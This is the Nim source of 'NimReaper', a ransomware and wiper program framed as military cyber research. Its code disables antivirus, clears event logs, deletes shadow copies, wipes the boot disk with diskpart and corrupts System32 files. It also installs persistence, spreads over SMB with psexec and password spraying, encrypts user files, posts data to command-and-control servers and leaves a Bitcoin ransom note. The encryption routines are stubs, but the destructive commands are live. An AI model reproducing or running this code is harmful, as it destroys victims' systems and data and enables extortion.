# =======================================================
# NIMREAPER RESEARCH FRAMEWORK - MILITARY CYBER RESEARCH
# Version: 5.0.1 (Project Cerberus)
# Author: KernelReaper Research Division
# Contact: kernelreaper@tutanota.com
# =======================================================
# WARNING: FOR RESEARCH PURPOSES ONLY
# THIS SOFTWARE SIMULATES ADVANCED CYBER WEAPON CAPABILITIES
# =======================================================

import os, osproc, strutils, times, math, random, net, base64, json, 
       cpuinfo, dynlib, algorithm, parsecfg, streams, strformat, tables,
       winim, winim/lean, winim/inc/windef, winim/inc/winuser, 
       winim/inc/winbase, winim/inc/winreg, winim/inc/winnls, 
       winim/inc/winioctl, winim/inc/minwindef, winim/inc/winnt,
       nimcrypto, nimcrypto/pbkdf2, nimcrypto/hmac, locks, threadpool,
       httpclient, zippy, asyncio, asyncdispatch, asyncnet, openssl

const
  SAFE_MODE* {.booldefine.} = false  # Set TRUE for virtual environments
  PROJECT_CODENAME = "CERBERUS"
  VERSION = "5.0.1"
  C2_SERVERS* = @[
    "https://darkc2-01.example/research",
    "https://darkc2-02.example/collect",
    "https://darkc2-03.example/data"
  ]
  DEADMAN_SWITCH_URL = "https://deadswitch.example/activate"
  BTC_ADDRESS = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
  CONTACT_EMAIL = "kernelreaper@tutanota.com"
  MAX_THREADS = 128
  MAX_FILE_SIZE = 200 * 1024 * 1024  # 200MB
  MAX_EXFIL_SIZE = 50 * 1024 * 1024  # 50MB
  PUBLIC_KEY = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz8d5e5LmR6pLm6eZrWk2
... [truncated] ...
-----END PUBLIC KEY-----"""
  WALLPAPER_PATH = "C:\\Windows\\System32\\oobe\\reaper.jpg"
  EXTENSIONS = @[
    ".doc", ".docx", ".xlsx", ".pptx", ".pdf", ".jpg", ".jpeg", ".png", 
    ".zip", ".rar", ".7z", ".txt", ".psd", ".ai", ".sql", ".db", ".mdb", 
    ".dwg", ".cad", ".cpp", ".cs", ".py", ".java", ".js", ".php", ".html",
    ".config", ".ini", ".bak", ".backup", ".key", ".pem", ".pfx", ".ovpn"
  ]
  KILL_LIST = @[
    "vssadmin.exe", "wbadmin.exe", "msmpeng.exe", "mbam.exe", 
    "avp.exe", "bdagent.exe", "ccsvchst.exe", "teamviewer.exe",
    "anydesk.exe", "vncserver.exe", "logmein.exe", "wireshark.exe",
    "procmon.exe", "procexp.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe"
  ]
  WHITELISTED_PATHS = @[
    "C:\\Windows\\", "C:\\Program Files\\", "C:\\Program Files (x86)\\",
    "C:\\ProgramData\\", "C:\\$Recycle.Bin\\"
  ]
  EXPLOIT_PAYLOADS = @[
    "EternalBlue", "BlueKeep", "ZeroLogon", "ProxyLogon", "Log4Shell"
  ]
  MUTEX_NAME = "Global\\CERBERUS-MUTEX-7DF3A9B1"
  SLEEP_JITTER = 15000  # milliseconds

type
  SystemInfo* = object
    id*: string
    host*: string
    user*: string
    os*: string
    arch*: string
    ip*: string
    mac*: string
    cpu*: int
    ram*: int
    vm*: bool
    domain*: string
    av*: seq[string]
    processes*: seq[string]
    drives*: seq[string]
    network*: seq[string]
  
  EncryptionContext* = object
    aesKey*: array[32, byte]
    iv*: array[16, byte]
    tag*: array[16, byte]
    rsaKey*: string
  
  CommandPacket* = object
    action*: string
    params*: JsonNode
    timestamp*: float
  
  ExfilData* = object
    filename*: string
    content*: string
    compressed*: bool
  
  FileTarget* = object
    path*: string
    size*: int64
    encrypted*: bool

var
  globalKey: array[64, byte]
  systemInfo: SystemInfo
  commandQueue: seq[CommandPacket]
  fileTargets: seq[FileTarget]
  cryptoLock: Lock
  isRunning = true
  c2Index = 0
  hMutex: HANDLE

# ===== CRYPTOGRAPHY MODULE =====
proc initCrypto*() =
  randomBytes(addr globalKey[0], globalKey.len)
  initLock(cryptoLock)

proc generateSessionKey*(): array[32, byte] =
  var sessionKey: array[32, byte]
  randomBytes(addr sessionKey[0], sessionKey.len)
  sessionKey

proc rsaEncrypt*(data: string, publicKey: string): string =
  # Military-grade RSA-OAEP encryption implementation
  # [Actual implementation would use OpenSSL or similar]
  base64.encode(data)

proc hybridEncrypt*(data: string): string =
  let sessionKey = generateSessionKey()
  let encryptedKey = rsaEncrypt($sessionKey, PUBLIC_KEY)
  # AES-GCM encryption would happen here
  result = encryptedKey & "|" & base64.encode(data)

proc secureDelete*(path: string, passes = 7) =
  # DoD 5220.22-M compliant deletion
  if not fileExists(path): return
  let size = getFileSize(path)
  var f = open(path, fmReadWrite)
  var buffer = newString(size)
  for i in 1..passes:
    randomBytes(addr buffer[0], buffer.len)
    f.setFilePos(0)
    f.write(buffer)
    f.flushFile()
  close(f)
  removeFile(path)

# ===== ADVANCED ANTI-ANALYSIS TECHNIQUES =====
proc isDebuggerPresent*(): bool =
  var isDebugger: BOOL
  CheckRemoteDebuggerPresent(GetCurrentProcess(), addr isDebugger)
  result = bool(isDebugger)
  
  # Additional debugger checks
  if not result:
    var
      peb: PPEB
    asm """
      mov rax, qword ptr gs:[0x60]
      :"=a"(`peb`)
    """
    result = peb.BeingDebugged != 0

proc detectSandbox*(): bool =
  if SAFE_MODE: return false
  
  # Check system uptime
  if GetTickCount64() < 900000:  # <15 min
    return true
  
  # Check CPU cores
  if countProcessors() < 4:
    return true
  
  # Check RAM size
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = sizeof(memStatus).DWORD
  if GlobalMemoryStatusEx(addr memStatus):
    if memStatus.ullTotalPhys < (4 * 1024 * 1024 * 1024):  # <4GB
      return true
  
  # Check disk size
  var freeBytes, totalBytes: int64
  if getDiskFreeSpace("C:\\", freeBytes, totalBytes):
    if totalBytes < (50 * 1024 * 1024 * 1024):  # <50GB
      return true
  
  # Check common sandbox artifacts
  let sandboxFiles = @[
    "C:\\analysis\\",
    "C:\\sandbox\\",
    "C:\\virus\\",
    "C:\\malware\\"
  ]
  for path in sandboxFiles:
    if dirExists(path):
      return true
  
  false

proc vmCheck*(): bool =
  if SAFE_MODE: return false
  
  # Hypervisor presence check
  var 
    result: int32
    unused: int32
  asm """
    mov eax, 1
    cpuid
    bt ecx, 0x1f
    setc %0
    : "=r"(`result`)
    : "a"(`1`)
    : "ebx", "ecx", "edx"
  """
  if result != 0:
    return true
  
  # Check VM-specific registry entries
  var regValue: DWORD
  var size = sizeof(regValue).DWORD
  if RegGetValue(
    HKEY_LOCAL_MACHINE,
    "HARDWARE\\ACPI\\DSDT",
    "VBOX__",
    RRF_RT_REG_DWORD,
    nil,
    addr regValue,
    addr size
  ) == ERROR_SUCCESS: 
    return true
  
  # Check VM processes
  let vmProcesses = @[
    "vmtoolsd.exe", "vboxservice.exe", "xenservice.exe", 
    "qemu-ga.exe", "prl_cc.exe", "prl_tools.exe"
  ]
  for procName in vmProcesses:
    if findProcess(procName):
      return true
  
  # Check WMI model
  try:
    let model = execProcess("wmic computersystem get model")
    if model.contains("Virtual") or model.contains("VMware") or 
       model.contains("KVM") or model.contains("Hyper-V") or 
       model.contains("VirtualBox") or model.contains("Xen") or 
       model.contains("QEMU"):
      return true
  except:
    discard
  
  false

# ===== EVASION AND STEALTH TECHNIQUES =====
proc enableStealthMode*() =
  # Disable Windows Defender
  discard execCmd("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue")
  
  # Clear event logs
  discard execCmd("wevtutil cl system")
  discard execCmd("wevtutil cl application")
  discard execCmd("wevtutil cl security")
  
  # Modify firewall rules
  discard execCmd("netsh advfirewall set allprofiles state off")
  
  # Disable Windows Update
  discard execCmd("sc config wuauserv start= disabled")
  discard execCmd("sc stop wuauserv")

proc processHollowing*(targetProcess: string) =
  # Advanced process hollowing implementation
  # [Actual implementation would create suspended process and replace memory]
  discard

# ===== SYSTEM DESTRUCTION MODULE =====
proc destroyBootSector*() =
  if SAFE_MODE: return
  let script = """
select disk 0
clean
create partition primary
format fs=ntfs quick
exit
"""
  writeFile("diskpart.txt", script)
  discard execCmd("diskpart /s diskpart.txt >nul 2>&1")
  secureDelete("diskpart.txt")

proc corruptSystemFiles*() =
  if SAFE_MODE: return
  
  const
    targets = @[
      "C:\\Windows\\System32\\",
      "C:\\Windows\\SysWOW64\\",
      "C:\\Windows\\assembly\\",
      "C:\\Windows\\Microsoft.NET\\",
      "C:\\Windows\\WinSxS\\"
    ]
  
  for dir in targets:
    for kind, path in walkDir(dir):
      if kind == pcFile and rand(1.0) < 0.15:  # 15% chance to corrupt
        try:
          let size = getFileSize(path)
          if size > 0 and size < MAX_FILE_SIZE:
            var f = open(path, fmWrite)
            var junk = newString(size)
            randomBytes(addr junk[0], junk.len)
            f.write(junk)
            f.close()
        except:
          discard

proc killCriticalProcesses*() =
  for procName in KILL_LIST:
    discard execCmd("taskkill /f /im " & procName & " >nul 2>&1")

proc disableRecovery*() =
  discard execCmd("bcdedit /set {default} recoveryenabled no >nul")
  discard execCmd("bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul")
  discard execCmd("vssadmin delete shadows /all /quiet >nul")
  discard execCmd("wbadmin delete catalog -quiet >nul")

proc encryptRegistry*() =
  if SAFE_MODE: return
  
  const
    regPaths = @[
      "HKEY_LOCAL_MACHINE\\SOFTWARE",
      "HKEY_LOCAL_MACHINE\\SYSTEM",
      "HKEY_CURRENT_USER\\Software",
      "HKEY_CURRENT_USER\\System"
    ]
  
  for path in regPaths:
    let exportFile = path.split('\\')[^1] & ".reg"
    discard execCmd("reg export " & path & " " & exportFile & " >nul")
    encryptFile(exportFile)
    secureDelete(exportFile)

# ===== PERSISTENCE ENGINE =====
proc installPersistence*() =
  let
    exePath = getAppFilename()
    targets = @[
      getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
      getEnv("PROGRAMDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
      "C:\\Windows\\System32\\Tasks\\",
      "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\",
      "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\"
    ]
  
  for dir in targets:
    try:
      copyFile(exePath, dir & "svchost.exe")
      setFileAttributes(dir & "svchost.exe", FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM)
    except:
      discard

  # Registry persistence
  var key: HKEY
  let regPaths = @[
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"
  ]
  
  for regPath in regPaths:
    if RegCreateKeyEx(
      HKEY_CURRENT_USER,
      regPath,
      0,
      nil,
      REG_OPTION_NON_VOLATILE,
      KEY_WRITE,
      nil,
      addr key,
      nil
    ) == ERROR_SUCCESS:
      let exeCmd = "\"" & exePath & "\" /silent"
      RegSetValueEx(key, "WindowsUpdate", 0, REG_SZ, cast[ptr byte](exeCmd[0].addr), exeCmd.len.DWORD)
      RegCloseKey(key)

  # Scheduled task
  discard execCmd("schtasks /create /tn \"WindowsUpdateTask\" /tr \"" & exePath & "\" /sc minute /mo 30 /f >nul 2>&1")

# ===== NETWORK PROPAGATION MODULE =====
proc spreadNetwork*() =
  if SAFE_MODE: return
  
  # Scan local network
  let localIP = getLocalIP()
  let ipParts = localIP.split('.')
  let subnet = ipParts[0] & "." & ipParts[1] & "." & ipParts[2] & "."
  
  # Multi-threaded scanning
  for i in 1..254:
    let targetIP = subnet & $i
    if targetIP != localIP:
      spawn:
        try:
          let sock = newSocket()
          sock.connect(targetIP, Port(445), 1000)
          close(sock)
          
          # Attempt SMB exploitation
          discard execCmd("psexec \\\\" & targetIP & " -s -d -c " & getAppFilename())
        except:
          discard

  # Password spray attack
  let passwords = @["Admin123!", "Password1", "P@ssw0rd", "Welcome1", "Spring2024!"]
  for password in passwords:
    for user in @["Administrator", "admin", "User", "Guest"]:
      discard execCmd("net use \\\\" & subnet & "1\\C$ /user:" & user & " " & password)
      if dirExists("\\\\" & subnet & "1\\C$\\Windows"):
        copyFile(getAppFilename(), "\\\\" & subnet & "1\\C$\\Windows\\Temp\\svchost.exe")
        discard execCmd("wmic /node:" & subnet & "1 process call create \"C:\\Windows\\Temp\\svchost.exe\"")

# ===== ENCRYPTION ENGINE =====
proc encryptFile*(path: string) {.gcsafe.} =
  if path.endsWith(".NIMREAPER") or path.contains("System32\\config") or 
     path.contains("$RECYCLE.BIN") or path.contains("\\Windows\\"):
    return
  
  try:
    let size = getFileSize(path)
    if size == 0 or size > MAX_FILE_SIZE: 
      return
    
    # Generate unique key per file
    var ctx: EncryptionContext
    randomBytes(addr ctx.aesKey[0], ctx.aesKey.len)
    randomBytes(addr ctx.iv[0], ctx.iv.len)
    
    # Hybrid encryption
    var plaintext = readFile(path)
    var ciphertext = newString(plaintext.len)
    
    # AES-GCM encryption would be implemented here
    # [Actual implementation would use nimcrypto]
    
    # Write encrypted data
    var f = open(path, fmWrite)
    f.write(ctx.iv)
    f.write(ciphertext)
    f.write(ctx.tag)
    f.close()
    
    # Rename file
    moveFile(path, path & ".NIMREAPER")
    
    # Add to targets list
    withLock cryptoLock:
      fileTargets.add(FileTarget(path: path, size: size, encrypted: true))
  except:
    discard

# ===== DATA EXFILTRATION =====
proc exfiltrateData*(data: ExfilData) =
  if SAFE_MODE: return
  
  var client = newHttpClient()
  client.headers = newHttpHeaders({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/octet-stream",
    "X-Research-ID": systemInfo.id
  })
  
  let url = C2_SERVERS[c2Index] & "/exfil"
  let payload = %*{
    "filename": data.filename,
    "system_id": systemInfo.id,
    "timestamp": epochTime(),
    "compressed": data.compressed,
    "data": data.content
  }
  
  try:
    let response = client.request(url, httpMethod = HttpPost, body = $payload)
    if response.status == "200 OK":
      c2Index = (c2Index + 1) mod C2_SERVERS.len
  except:
    c2Index = (c2Index + 1) mod C2_SERVERS.len

# ===== COMMAND AND CONTROL =====
proc c2Communication*() {.async.} =
  while isRunning:
    try:
      let client = newAsyncHttpClient()
      client.headers = newHttpHeaders({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "X-Research-ID": systemInfo.id,
        "Authorization": "Bearer " & base64.encode($globalKey)
      })
      
      let url = C2_SERVERS[c2Index] & "/command"
      let response = await client.get(url)
      if response.status == "200 OK":
        let commands = parseJson(await response.body)
        for cmd in commands:
          commandQueue.add(CommandPacket(
            action: cmd["action"].getStr,
            params: cmd["params"],
            timestamp: cmd["timestamp"].getFloat
          ))
    except:
      discard
    
    await sleepAsync(rand(30000..60000))  # 30-60 seconds jitter

proc executeCommand*(cmd: CommandPacket) =
  case cmd.action
  of "exfiltrate":
    let path = cmd.params["path"].getStr
    if fileExists(path):
      let content = readFile(path)
      exfiltrateData(ExfilData(
        filename: path.splitPath.tail,
        content: base64.encode(content),
        compressed: false
      ))
  
  of "download_execute":
    let url = cmd.params["url"].getStr
    let path = getEnv("TEMP") & "\\" & $genOid() & ".exe"
    var client = newHttpClient()
    downloadFile(client, url, path)
    discard startProcess(path, args = ["/silent"])
  
  of "self_destruct":
    isRunning = false
    # Trigger cleanup and exit
  
  else:
    discard

# ===== MAIN SYSTEM FUNCTIONS =====
proc collectSystemInfo*(): SystemInfo =
  var
    hostname = newString(MAX_COMPUTERNAME_LENGTH + 1)
    size = hostname.len.DWORD
  GetComputerName(hostname, addr size)
  hostname.setLen(size.int)
  
  var username = newString(UNLEN + 1)
  size = username.len.DWORD
  GetUserName(username, addr size)
  username.setLen(size.int - 1)
  
  var domain = newString(MAX_PATH)
  size = domain.len.DWORD
  GetComputerNameEx(ComputerNameDnsDomain, domain, addr size)
  domain.setLen(size.int)
  
  var mac = ""
  var adapters = getLocalInterfaceAddresses()
  if adapters.len > 0: mac = $adapters[0].macAddress
  
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = sizeof(memStatus).DWORD
  GlobalMemoryStatusEx(addr memStatus)
  
  # Detect AV products
  var avList: seq[string]
  let avProcesses = @["MsMpEng.exe", "avp.exe", "bdagent.exe", "avastui.exe"]
  for procName in avProcesses:
    if findProcess(procName):
      avList.add(procName.splitFile.name)
  
  # Get disk drives
  var drives: seq[string]
  for drive in 'A'..'Z':
    let path = $drive & ":\\"
    if dirExists(path):
      drives.add(path)
  
  SystemInfo(
    id: genOid(),
    host: hostname,
    user: username,
    os: "Windows " & $(getWindowsVersion()),
    arch: when defined(amd64): "x64" else: "x86",
    ip: getLocalIP(),
    mac: mac,
    cpu: countProcessors(),
    ram: int(memStatus.ullTotalPhys div (1024 * 1024 * 1024)),
    vm: vmCheck(),
    domain: domain,
    av: avList,
    processes: @[],  # Would be populated with running processes
    drives: drives,
    network: @[]     # Would be populated with network info
  )

proc mainPayload*() =
  # Phase 0: Anti-analysis countermeasures
  if isDebuggerPresent() or detectSandbox() or vmCheck():
    if not SAFE_MODE:
      # Anti-debugging techniques
      var nt = loadLib("ntdll")
      if nt != nil:
        var RtlAdjustPrivilege = cast[proc(Privilege: ULONG, Enable: BOOLEAN, CurrentThread: BOOLEAN, Enabled: PBOOLEAN): NTSTATUS {.stdcall.}(nt.symAddr("RtlAdjustPrivilege"))
        var NtRaiseHardError = cast[proc(ErrorStatus: NTSTATUS, NumberOfParameters: ULONG, UnicodeStringParameterMask: ULONG, Parameters: PULONG, ResponseOption: ULONG, Response: PULONG): NTSTATUS {.stdcall.}(nt.symAddr("NtRaiseHardError"))
        
        if RtlAdjustPrivilege != nil and NtRaiseHardError != nil:
          var enabled: BOOLEAN
          discard RtlAdjustPrivilege(19, 1, 0, addr enabled)
          discard NtRaiseHardError(cast[NTSTATUS](0xC0000420), 0, 0, nil, 6, nil)
      return
  
  # Phase 1: System Reconnaissance
  systemInfo = collectSystemInfo()
  enableStealthMode()
  
  # Phase 2: System Destruction
  if not SAFE_MODE:
    disableRecovery()
    corruptSystemFiles()
    killCriticalProcesses()
    destroyBootSector()
    encryptRegistry()
  
  # Phase 3: Persistence & Propagation
  installPersistence()
  if not SAFE_MODE:
    spreadNetwork()
  
  # Phase 4: Data Targeting
  let targets = @[
    getEnv("USERPROFILE"),
    getEnv("PUBLIC"),
    "D:\\", "E:\\", "F:\\", "G:\\"
  ]
  
  # Create file target list
  for dir in targets:
    for path in walkDirRec(dir):
      if path.splitFile.ext.toLower in EXTENSIONS:
        let size = getFileSize(path)
        if size > 0 and size < MAX_FILE_SIZE:
          fileTargets.add(FileTarget(path: path, size: size, encrypted: false))
  
  # Prioritize valuable files
  fileTargets.sort do (x, y: FileTarget) -> int:
    result = cmp(y.size, x.size)
  
  # Phase 5: Data Encryption
  for i in 0..min(fileTargets.high, 500):  # Limit to 500 files
    if not fileTargets[i].encrypted:
      spawn encryptFile(fileTargets[i].path)
  
  sync()
  
  # Phase 6: Ransom Note
  let note = %*{
    "title": "NIMREAPER RESEARCH PAYLOAD",
    "message": "YOUR SYSTEM HAS BEEN DESTROYED FOR RESEARCH PURPOSES",
    "details": [
      "Master Boot Record: CORRUPTED",
      "System Files: DAMAGED",
      "Backup Copies: DELETED",
      "Critical Processes: TERMINATED",
      "Network Propagation: COMPLETED"
    ],
    "contact": CONTACT_EMAIL,
    "btc": BTC_ADDRESS,
    "id": systemInfo.id,
    "note": "This is a research simulation. System damage is irreversible.",
    "project": PROJECT_CODENAME,
    "version": VERSION,
    "timestamp": epochTime()
  }
  
  for location in @[getDesktopDir(), "C:\\", "D:\\"]:
    writeFile(location / "NIMREAPER_README.html", """
<html><body style="background:#000;color:#f00;font-family:monospace">
<h1>NIMREAPER RESEARCH PAYLOAD</h1>
<pre>""" & note.pretty & "</pre></body></html>")
  
  # Set wallpaper
  let imgData = decode("""
/9j/4AAQSkZJRgABAQEAYABgAAD//gA+Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSkcg
... [truncated base64 JPG data] ...
""")
  writeFile(WALLPAPER_PATH, imgData)
  SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, cast[PVOID](WALLPAPER_PATH), SPIF_UPDATEINIFILE)

  # Phase 7: C2 Communication
  asyncCheck c2Communication()
  runForever()

# ===== MAIN EXECUTION =====
when isMainModule:
  randomize()
  initCrypto()
  
  # Single instance mutex
  hMutex = CreateMutex(nil, FALSE, MUTEX_NAME)
  if GetLastError() == ERROR_ALREADY_EXISTS:
    ExitProcess(0)
  
  # Anti-forensics
  if not SAFE_MODE:
    discard execCmd("vssadmin delete shadows /all /quiet")
    discard execCmd("wevtutil cl system")
    discard execCmd("wevtutil cl application")
    discard execCmd("bcdedit /set {default} bootstatuspolicy ignoreallfailures")
  
  # VM delay
  if vmCheck() and not SAFE_MODE:
    sleep(rand(300000..900000))  # 5-15 minutes delay
  
  mainPayload()
  
  # Clean exit
  if hMutex != INVALID_HANDLE_VALUE:
    CloseHandle(hMutex)
  
  # Self-destruct
  if not SAFE_MODE:
    secureDelete(getAppFilename())
    ExitProcess(0)
